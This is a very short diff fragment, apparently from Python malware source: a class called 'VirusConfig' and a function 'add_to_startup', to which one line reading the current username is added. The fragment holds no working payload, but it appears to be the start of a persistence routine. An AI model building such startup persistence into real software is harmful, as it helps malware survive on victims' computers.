@@ -150,3 +150,4 @@ class VirusConfig:
 # -------------------- #
 
 def add_to_startup():
+    username = os.environ["username"]
